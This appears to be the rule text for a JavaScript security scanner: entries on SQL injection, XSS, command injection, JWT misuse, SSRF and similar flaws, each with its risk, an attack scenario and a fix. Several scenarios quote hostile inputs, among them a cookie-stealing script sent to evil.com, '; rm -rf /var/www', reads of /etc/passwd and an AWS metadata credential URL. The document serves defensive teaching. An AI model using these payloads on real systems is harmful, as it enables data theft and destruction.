rules.name: SQL Injection – string concatenation
rules.why: User input is concatenated directly into the SQL query without sanitisation.
rules.scenario: An attacker enters ' OR '1'='1 in an input field and gains access to the entire database. Can also delete data or take over the server.
rules.fix: Always use parameterised queries: db.query("SELECT * FROM users WHERE id = ?", [id])

rules.name: XSS – unsanitised innerHTML
rules.why: User data is rendered directly as HTML without escaping.
rules.scenario: An attacker injects <script>document.location="https://evil.com?c="+document.cookie</script> and steals session cookies from all visitors.
rules.fix: Use textContent instead of innerHTML, or sanitise with DOMPurify before assignment.

rules.name: Command Injection – shell execution with user input
rules.why: Shell commands are built with unvalidated user input and executed directly on the server.
rules.scenario: An attacker sends "; rm -rf /var/www" as input. The server executes it as a shell command with the application's privileges.
rules.fix: Avoid exec with user input. Use parameterised alternatives (child_process.execFile) or whitelist allowed values.

rules.name: SQL Injection – tainted variable in query
rules.why: A variable assigned from req.query/req.body is concatenated into a SQL query without parameterisation.
rules.scenario: const id = req.query.id; db.query("SELECT * FROM users WHERE id = " + id) — attacker sends ?id=1 OR 1=1.
rules.fix: Use parameterised queries: db.query("SELECT * FROM users WHERE id = ?", [id])

rules.name: XSS – tainted variable assigned to innerHTML
rules.why: A variable assigned from user input is rendered as HTML without escaping.
rules.scenario: const name = req.query.name; el.innerHTML = name — attacker injects <script> tags.
rules.fix: Use textContent instead of innerHTML, or sanitise with DOMPurify.sanitize() before assignment.

rules.name: Command Injection – tainted variable in shell command
rules.why: A variable assigned from req.query/req.body is passed to a shell command without sanitisation.
rules.scenario: const cmd = req.query.cmd; exec(cmd) — attacker sends ?cmd=; cat /etc/passwd.
rules.fix: Never pass user input to exec(). Use execFile() with an array of arguments, never a shell string.

rules.name: Unparameterized query – dynamic string construction
rules.why: The SQL query is constructed with string concatenation or a template literal. Even if current values appear safe, this pattern invites SQL injection as the codebase grows.
rules.scenario: A developer adds a new dynamic value later using the same pattern — one unescaped value exposes the entire query.
rules.fix: Use parameterised queries: db.query("SELECT * FROM t WHERE id = ?", [id]) — never interpolate variables into query strings.

rules.name: Route missing authentication middleware
rules.why: Route is missing visible authentication middleware — data may be accessible without logging in.
rules.scenario: Anyone can call the endpoint directly without being logged in and access data that should be protected.
rules.fix: Add auth middleware as the second argument: router.get("/data", requireAuth, async (req, res) => { ... })

rules.name: IDOR – object fetched without ownership check
rules.why: Objects are fetched directly with an ID from the URL/body without verifying that the user owns them.
rules.scenario: A user with order ID 42 can change the URL to /api/orders/99 and view another customer's order. Known as Insecure Direct Object Reference (IDOR).
rules.fix: Always add an ownership check: db.findOne({ _id: id, userId: req.user.id })

rules.name: Mass assignment – uncontrolled req.body
rules.why: The entire req.body is passed directly to a database operation without whitelist filtering.
rules.scenario: An attacker adds isAdmin: true to their POST request and gains administrator privileges if the field exists in the database.
rules.fix: Destructure and whitelist specific fields: const { name, email } = req.body; User.create({ name, email })

rules.name: Password in URL-encoded string – risk of GET exposure
rules.why: A URL-encoded string containing password= risks ending up as a GET parameter in the URL, exposing the password in server logs, browser history and Referer headers.
rules.scenario: If $.ajax({url: endpoint + "?" + postdata}) is used instead of POST, the password appears in the URL and is visible in Apache/nginx logs.
rules.fix: Send passwords as JSON via fetch/axios: fetch(url, { method: "POST", body: JSON.stringify({ username, password }) }) — never as a query string.

rules.name: JWT not verified – decode without verify
rules.why: jwt.decode() does not check the signature — anyone can create an arbitrary token.
rules.scenario: An attacker creates a JWT with payload {"role":"admin"} without knowing the secret. Without signature verification it is accepted as valid.
rules.fix: Always use jwt.verify(token, secret) instead of jwt.decode(token).

rules.name: JWT stored in localStorage
rules.why: localStorage is accessible via JavaScript and vulnerable to XSS attacks.
rules.scenario: If an XSS vulnerability exists, an attacker can read localStorage and steal all tokens. HttpOnly cookies are not accessible via JavaScript.
rules.fix: Store tokens in httpOnly, Secure cookies instead of localStorage.

rules.name: Weak password hashing algorithm (MD5/SHA1)
rules.why: MD5 and SHA1 are cryptographically broken and unsuitable for password hashing.
rules.scenario: An attacker who steals your database can crack MD5-hashed passwords using rainbow tables in minutes. Millions of passwords are already pre-hashed online.
rules.fix: Use bcrypt, argon2 or scrypt for passwords: const hash = await bcrypt.hash(password, 12)

rules.name: Mapbox public token in frontend
rules.why: Mapbox public tokens are intended for frontend use but require active domain restriction to be safe.
rules.scenario: Without domain restriction anyone can use your token for map requests at your expense.
checklist: Domain restriction enabled in Mapbox Account → Tokens
Scope limited to required services only
Rotation plan documented if token is abused
rules.fix: Enable domain restriction in Mapbox Account → Tokens. Set usage limits.

rules.name: Google Maps API key in frontend
rules.why: Google Maps API keys in frontend code are visible to everyone. Google recommends HTTP referrer restrictions.
rules.scenario: Unrestricted Google Maps keys can be abused and result in unexpected costs. Cases involving thousands of dollars in unintended charges are well documented.
checklist: HTTP referrer restriction enabled in Google Cloud Console
API restriction – only Maps JavaScript API enabled for this key
Billing alerts configured in Google Cloud
Separate key for production vs. development
rules.fix: Enable HTTP referrer restriction in Google Cloud Console. Set API restrictions and billing alerts.

rules.name: Stripe publishable key in frontend
rules.why: Stripe's publishable key is public by design but its exposure should be documented and Radar rules should be active.
rules.scenario: A publishable key can be used to create payment forms in your name for social engineering attacks.
checklist: Confirmed this is the publishable key (pk_live_) — NOT the secret key (sk_live_)
Stripe Radar rules configured to flag unusual activity
Webhook verification enabled for all incoming events
rules.fix: Confirm Radar rules are active in Stripe Dashboard. Verify webhook signatures.

rules.name: Firebase configuration in frontend
rules.why: Firebase config in the frontend requires correctly configured Security Rules — otherwise the database is open.
rules.scenario: Without strict Security Rules anyone with your Firebase config can read or write to your database.
checklist: Firebase Security Rules reviewed and tested
Authentication enabled — no anonymous write operations permitted
App Check enabled to verify that requests originate from your app
rules.fix: Review and test Firebase Security Rules. Enable App Check.

rules.name: Source map exposed in production
rules.why: Source map files (.map) should never be served in production. Their presence indicates the build pipeline is not stripping source maps before deployment — which means your own bundled source code is very likely exposed as well.
rules.scenario: An attacker opens DevTools, finds the sourceMappingURL reference, and downloads the .map file. They can now read the original unminified source of your application.
checklist: Source maps are NOT generated in the production build (check webpack/vite/rollup config)
If source maps are needed for error tracking — use a private source map server (e.g. Sentry)
Verify that .map files are blocked by the web server / CDN in production
Check that CI/CD pipeline does not deploy the /dist folder including .map files
rules.fix: Disable source map generation in production build config. Use a private source map service for error tracking.

rules.name: Hardcoded API key or secret in source code
rules.why: Hardcoded secrets are exposed to everyone with repository access — current and former employees, CI systems, forks, and anyone who finds the repo public or leaked.
rules.scenario: Developer hardcodes const API_SECRET = "sk-prod-abc123..." during local testing. It ships in a commit, the repo becomes public six months later, the secret is harvested within hours by automated scanners.
rules.fix: const apiSecret = process.env.API_SECRET. Store secrets in .env (git-ignored) locally, and in environment variables or a secrets manager in production.

rules.name: Hardcoded JWT secret or encryption key
rules.why: A hardcoded JWT secret means all tokens can be forged by anyone who reads the source code. A hardcoded encryption key means all encrypted data can be decrypted.
rules.scenario: jwt.sign(payload, "mysecretkey") is in source. Attacker reads the key from GitHub, signs arbitrary payloads, and impersonates any user.
rules.fix: const secret = process.env.JWT_SECRET. Generate with: node -e "console.log(require('crypto').randomBytes(64).toString('hex'))". Minimum 256 bits for HMAC-SHA256.

rules.name: Open redirect — unvalidated URL from request used in redirect
rules.why: Redirecting to an attacker-controlled URL enables phishing — users see a legitimate domain in the link and are redirected to a malicious site after clicking.
rules.scenario: Login flow: res.redirect(req.query.returnUrl). Attacker sends users a link to yourapp.com/login?returnUrl=https://evil.com/fake-login.
rules.fix: Validate the redirect target: const allowed = ["/dashboard", "/profile"]; res.redirect(allowed.includes(target) ? target : "/"). Only allow relative paths or explicitly allowlisted URLs.

rules.name: Path traversal — user input used directly in file system operation
rules.why: Using request input directly in file system calls allows directory traversal. path.join() does not sanitize — path.join("/uploads", "../../etc/passwd") resolves to /etc/passwd.
rules.scenario: GET /file?name=report.pdf becomes fs.readFile(path.join(__dirname, req.query.name)). Attacker requests ?name=../../etc/passwd and receives the server's password file.
rules.fix: Resolve and validate: const base = path.resolve("/safe/uploads"); const target = path.resolve(base, req.query.name); if (!target.startsWith(base)) return res.status(403).send("Forbidden");

rules.name: Weak random number generator used for security-sensitive value
rules.why: Math.random() is a pseudo-random number generator (PRNG) — not a cryptographically secure RNG. Its output is predictable given enough observed values.
rules.scenario: const resetToken = Math.random().toString(36).slice(2) used as a password-reset token. An attacker who observes a few tokens can statistically predict the next one and take over any account.
rules.fix: Use the built-in crypto module: const token = require("crypto").randomBytes(32).toString("hex"). For shorter codes: crypto.randomInt(100000, 999999).

rules.name: Hardcoded encryption key or IV in crypto operation
rules.why: Hardcoding the encryption key and IV means all encrypted data uses the same key, visible to anyone with source access. A static IV also makes the encryption deterministic.
rules.scenario: createCipheriv("aes-256-cbc", "mysecretkey12345", "myiv123456789012") in source. Attacker reads key and IV, decrypts all stored data.
rules.fix: Key: const key = Buffer.from(process.env.ENCRYPTION_KEY, "hex"). IV: generate fresh for every encryption: const iv = crypto.randomBytes(16).

rules.name: Exception details or stack trace exposed to client in error response
rules.why: Returning raw error objects or stack traces to the client reveals internal file paths, library versions, database schema details, and application logic.
rules.scenario: catch (err) { res.json(err) } — the response includes stack: "at /home/app/src/db/users.js:47:12". Attacker now knows the internal path structure and exact table names.
rules.fix: Log the full error server-side; return a generic message to the client: catch (err) { logger.error(err); res.status(500).json({ error: "Internal server error" }) }

rules.name: Request data logged to console
rules.why: Logging req.body, req.headers, or req.cookies sends all client-supplied data — including passwords, tokens, and auth headers — to stdout/stderr, where log aggregation systems collect and retain it.
rules.scenario: console.log('Login:', req.body) logs { username: 'admin', password: 'hunter2' } to production logs.
rules.fix: Log only sanitized fields: const safe = { ...req.body }; delete safe.password; logger.info('Login', safe). Never log the full request object.

rules.name: Environment variable logged to console
rules.why: Environment variables in Node.js are the standard location for secrets (API keys, tokens, passwords). Logging process.env.VARNAME sends the secret value to stdout/stderr.
rules.scenario: console.log('Key:', process.env.OPENAI_API_KEY) writes the full API key to the log.
rules.fix: Never log environment variables directly. Log presence only: logger.info('API key configured:', !!process.env.OPENAI_API_KEY).

rules.name: Potentially sensitive variable logged to console
rules.why: Logging variables with names suggesting secrets may expose credentials to log aggregation systems. Review whether the actual value — not just the variable name — is being logged.
rules.scenario: console.log('Auth failed, token:', authToken) writes the token value to logs.
rules.fix: Log only non-sensitive metadata: logger.info('Auth failed', { tokenPresent: !!authToken }). Never log the value of auth credentials.

rules.name: SSRF — user-controlled URL passed to fetch, axios or http request
rules.why: Passing user-supplied URLs to outbound HTTP requests allows attackers to make the server send requests to internal infrastructure — cloud metadata endpoints, internal databases, admin panels.
rules.scenario: fetch(req.query.url) to proxy an image. Attacker sends ?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/. Server returns AWS IAM credentials.
rules.fix: Validate and restrict: parse the URL, check scheme (https only), resolve hostname and verify it is not a private/loopback range. Use an allowlist of permitted domains.
